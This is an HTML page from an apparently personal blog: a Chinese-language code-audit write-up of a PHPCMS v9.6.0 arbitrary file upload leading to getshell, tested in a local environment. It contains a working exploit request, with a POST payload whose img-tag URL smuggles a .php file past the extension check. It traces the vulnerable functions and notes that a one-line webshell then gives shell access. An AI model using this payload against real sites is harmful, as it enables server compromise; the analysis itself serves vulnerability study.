@@ -1,0 +1,258 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PHPCMSv9.6.0代码审计---前台登录界面getshell - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="利用过程前台注册界面存在注入点，构造payload：
+1234/index.php?m=member&amp;amp;c=index&amp;amp;a=register&amp;amp;siteid=1post数据：si,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">PHPCMSv9.6.0代码审计---前台登录界面getshell</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">PHPCMSv9.6.0代码审计---前台登录界面getshell</h1>
+        <div class="stuff">
+            <span>一月 25, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E4%BD%93%E9%AA%8C/" rel="tag">代码审计初体验</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>前台注册界面存在注入点，构造payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</span><br><span class="line"></span><br><span class="line">post数据：</span><br><span class="line">siteid=1&amp;modelid=11&amp;username=hgfhf&amp;password=0077975765nvn&amp;email=t786nb82@163.com&amp;info[content]=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://127.0.0.1/shell.txt?.php#.jpg</span>&gt;</span>&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220125102754876.png" alt="image-20220125102754876"></p>
+<p>将页面信息填满之后进行抓包改包，写入构造好的payload，这里我使用的是本地环境下的测试，直接在本机放shell.txt，内容为<?php phpinfo();?>。</p>
+<p>抓包：</p>
+<p><img src="image-20220125103930330.png" alt="image-20220125103930330"></p>
+<p>改包发包，得到一个回显的路径：</p>
+<p><img src="image-20220125103256201.png" alt="image-20220125103256201"></p>
+<p><img src="image-20220125103355154.png" alt="image-20220125103355154"></p>
+<p>返回一个新的路径，并且使用了我们构造好的后缀.php，尝试直接访问：</p>
+<p><img src="image-20220125103430497.png" alt="image-20220125103430497"></p>
+<p>这里我们利用的点是设置生日的地方info[content]，通过自行构造数据，从而导致任意文件的上传读取。根据poc的参数利用，我们对其进行跟进分析：</p>
+<hr>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>结合xdebug工具进行参数传递分析：</p>
+<p>首先找到注册界面的代码，根据/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1，找到的是member模块下的index.php里面的register方法：</p>
+<p><img src="image-20220125104444667.png" alt="image-20220125104444667"></p>
+<p>在代码134行，对post传入的参数info进行array_map()函数的处理，之后使用get()参数对info进行处理，跟进get()函数，</p>
+<p>位于member_input.class.php的第20行：</p>
+<p><img src="image-20220125104739383.png" alt="image-20220125104739383"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data即info的参数：一个变量名为content，值为<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://127.0.0.1/shell.txt?.php#.jpg</span>&gt;</span>的数组</span><br></pre></td></tr></table></figure>
+
+<p>首先经过trim_script()函数的过滤，将尖括号转化为HTML实体编码，之后在28行将变量值赋值给value作为键值对的值进行遍历，代码继续向下执行，往下跟进参数value，在代码的第48行，参数使用$func进行处理，通过跟进知道func即是editor()：</p>
+<p><img src="image-20220125105345764.png" alt="image-20220125105345764"></p>
+<p>跟进函数editor()，在member_input.class.php的59行：</p>
+<p><img src="image-20220125110137573.png" alt="image-20220125110137573"></p>
+<p>追踪参数value，继续跟进函数download()，位于attachment.class.php：</p>
+<p><img src="image-20220125113242144.png" alt="image-20220125113242144"></p>
+<p>代码生成了一个新的路径uploadpath，参数value经过new_stripslashes的处理，返回的值仍然不变。153行，使用preg_match_all函数，将string中含有前面正则表达式的内容放到多维数组matches中，其中正则表达式中使用两个反斜杠2，表示贪婪算法，matches中一直匹配子表达式，只要符合任意圆括号的值即可。</p>
+<p><img src="clipboard.png" alt="img"></p>
+<p>遍历数组matches[3]，matche的取值即为<a target="_blank" rel="noopener" href="http://127.0.0.1/shell.txt?.php#.jpg%EF%BC%8C%E5%B0%86%E5%85%B6%E5%B8%A6%E5%85%A5%E5%87%BD%E6%95%B0fillurl()%EF%BC%8C%E8%B7%9F%E8%BF%9B%E5%87%BD%E6%95%B0%EF%BC%8C%E4%BD%8D%E4%BA%8Eattachment.class.php%E4%B8%AD%EF%BC%9A">http://127.0.0.1/shell.txt?.php#.jpg，将其带入函数fillurl()，跟进函数，位于attachment.class.php中：</a></p>
+<p><img src="image-20220125114022171.png" alt="image-20220125114022171"></p>
+<p>第300-301行：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pos = strpos($surl,&#x27;#&#x27;);  //返回#在http://127.0.0.1/shell.txt?.php#.jpg中首次出现的位置 $pos=31</span><br><span class="line">if($pos&gt;0) $surl = substr($surl,0,$pos);  //返回http://127.0.0.1/shell.txt?.php</span><br></pre></td></tr></table></figure>
+
+<p>代码通过strpos()函数找到#的位置，然后通过sybstr()函数截取到#之前的部分内容，也就是在这两步中将后缀#.jpg去掉了。返回的$url =<a target="_blank" rel="noopener" href="http://127.0.0.1/shell.txt?.php%E3%80%82">http://127.0.0.1/shell.txt?.php。</a></p>
+<p><img src="image-20220125114513877.png" alt="image-20220125114513877"></p>
+<p>代码继续向下执行else语句，将surl的值赋给okurl，然后使用preg_replace()函数经过两次的正则匹配，返回http:////127.0.0.1/shell.txt?.php。</p>
+<p>因此fillurl()函数的返回结果即为：<a target="_blank" rel="noopener" href="http://127.0.0.1/shell.txt?.php%E3%80%82">http://127.0.0.1/shell.txt?.php。</a></p>
+<p>回到download函数：</p>
+<p><img src="image-20220125114900591.png" alt="image-20220125114900591"></p>
+<p>使用foreach语句遍历参数：file为参数的值：<a target="_blank" rel="noopener" href="http://127.0.0.1/shell.txt?.php%EF%BC%8C%E9%80%9A%E8%BF%87fileext()%E5%87%BD%E6%95%B0%E5%8F%96%E5%87%BA%E6%8B%93%E5%B1%95%E5%90%8D%EF%BC%9A">http://127.0.0.1/shell.txt?.php，通过fileext()函数取出拓展名：</a></p>
+<p><img src="image-20220125115040585.png" alt="image-20220125115040585"></p>
+<p>通过点（.）来获取，取到拓展名为php。</p>
+<p>再使用basename()函数，返回路径中的文件名部分，也就是shell.txt?，然后通过getname()函数生成一个随机数的文件名，后面直接拼接上上面返回的后缀名php：</p>
+<p><img src="image-20220125115313930.png" alt="image-20220125115313930"></p>
+<p>然后通过拼接将新生成的路径<a target="_blank" rel="noopener" href="http://127.0.0.1/phpcmsv9.6.0/uploadfile/2022/0124%E5%92%8C%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E6%8B%BC%E6%8E%A5%E8%B5%B7%E6%9D%A5%E8%B5%8B%E5%80%BC%E7%BB%99$newfile%E3%80%82%E7%84%B6%E5%90%8E%E8%B0%83%E7%94%A8%E4%BA%86upload_func%E4%B9%9F%E5%B0%B1%E6%98%AFcopy%E5%87%BD%E6%95%B0%EF%BC%88%E4%BB%A3%E7%A0%81%E5%BC%80%E5%A4%B4%E5%AE%9A%E4%B9%89%EF%BC%89%E5%B0%86%E6%96%87%E4%BB%B6http://127.0.0.1/shell.txt?.php%E7%9A%84%E5%86%85%E5%AE%B9%E5%A4%8D%E5%88%B6%E5%88%B0%E6%96%B0%E7%9A%84%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E4%B8%8B%EF%BC%8C%E4%BD%BF%E7%94%A8?%E6%98%AF%E5%9B%A0%E4%B8%BA%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%A8%E8%A7%A3%E6%9E%90%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BC%9A%E5%B0%86%EF%BC%88http://127.0.0.1/shell.txt?.php%EF%BC%89%E8%BF%99%E7%A7%8D%E5%BD%A2%E5%BC%8F%E7%9A%84%E9%93%BE%E6%8E%A5%E5%BD%93%E5%81%9A%E4%B8%80%E4%B8%AA%E5%85%A8%E6%96%B0%E7%9A%84%E9%93%BE%E6%8E%A5%E9%87%8D%E6%96%B0%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%B8%8D%E9%80%82%E7%94%A8%E7%BC%93%E5%AD%98%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82%E5%9B%A0%E6%AD%A4%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEhttp://127.0.0.1/shell.txt?.php%E5%92%8Chttp://127.0.0.1/shell.txt%E7%9A%84%E5%86%85%E5%AE%B9%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E7%AC%A6%E5%8F%B7%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B0%B1%E6%97%A0%E6%B3%95%E8%AF%BB%E5%8F%96%E5%88%B0%E5%AF%B9%E5%BA%94%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%97%A0%E6%B3%95%E5%AE%9E%E7%8E%B0%E5%B0%86%E5%86%85%E5%AE%B9%E5%A4%8D%E5%88%B6%E7%9A%84%E6%93%8D%E4%BD%9C%E3%80%82">http://127.0.0.1/phpcmsv9.6.0/uploadfile/2022/0124和随机生成的文件名拼接起来赋值给$newfile。然后调用了upload_func也就是copy函数（代码开头定义）将文件http://127.0.0.1/shell.txt?.php的内容复制到新的文件路径下，使用?是因为浏览器在解析的使用会将（http://127.0.0.1/shell.txt?.php）这种形式的链接当做一个全新的链接重新请求，不适用缓存的内容。因此直接访问http://127.0.0.1/shell.txt?.php和http://127.0.0.1/shell.txt的内容是一样的，使用其他符号浏览器就无法读取到对应文件的内容，也就无法实现将内容复制的操作。</a></p>
+<p><img src="image-20220125120448815.png" alt="image-20220125120448815"></p>
+<p>继续向下，download函数返回newpath的内容，也就是随机生成的新的文件路径的值，然后往回到editor函数：</p>
+<p><img src="image-20220125120636157.png" alt="image-20220125120636157"></p>
+<p>editor函数也返回value值，也就是新的文件路径，继续向上到get()函数：</p>
+<p><img src="image-20220125120743989.png" alt="image-20220125120743989"></p>
+<p>返回的info也就是变量名和变量的值：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$field：content</span><br><span class="line">$value：新的文件路径的值：http://127.0.0.1/phpcmsv9.6.0/uploadfile/2022/0124/随机数.php</span><br></pre></td></tr></table></figure>
+
+<p>继续向上，返回到register函数中：</p>
+<p><img src="image-20220125120959206.png" alt="image-20220125120959206"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user_model_info的值即为 &#123;content =&gt; http://127.0.0.1/phpcmsv9.6.0/uploadfile/2022/0124/随机数.php&#125;</span><br><span class="line">追踪参数，跟到150行，将数据userid和content以及对应的值通过insert函数插入到数据表中。</span><br></pre></td></tr></table></figure>
+
+<p>跟进insert函数：</p>
+<p><img src="image-20220125121716755.png" alt="image-20220125121716755"></p>
+<p>调用execute()函数：</p>
+<p><img src="image-20220125121830475.png" alt="image-20220125121830475"></p>
+<p>在这里我们结合数据库的内容查看：</p>
+<p><img src="image-20220125121907677.png" alt="image-20220125121907677"></p>
+<p>数据表中没有content字段，因此当我们将数据插入的时候，SQL语句报错，将语句回显出来，由于执行的是insert插入，所以对应的文件路径的值也会被爆出来。</p>
+<p>整体梳理一下思路：利用的点是post传递参数info，并且在代码中会对该参数进行处理，最后会执行插入数据库的操作，当构造不存在的字段名时，会使SQL语句报错，从而将文件的路径暴露出来。在构造中我们可以上传.php文件，构造成标签的形式是为了满足download()函数中的正则匹配，使用#.jpg是因为代码对后缀做了判断，并且使用#作为取值点。使用shell.txt?.php是因为代码中存在copy的操作，需要正确读取文件的内容，但是在取文件后缀名的时候，对参数过滤不严，采取的是通过fileext()函数直接拼接后缀名的方式，导致任意文件的上传。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post[&#x27;info&#x27;]——&gt;get()——&gt;editor()——&gt;download()</span><br><span class="line">                                       ||</span><br><span class="line">insert()&lt;—— register() &lt;—— get() &lt;—— editor()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在每次抓包发包的使用用户名、密码和邮箱都需要修改。</p>
+<p>将txt文件的内容换成一句话木马，就能直接连接蚁剑getshell：</p>
+<p><img src="image-20220125123417352.png" alt="image-20220125123417352"></p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yangxiaodi/p/6861115.html">https://www.cnblogs.com/yangxiaodi/p/6861115.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/273/">https://paper.seebug.org/273/</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">利用过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">2.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
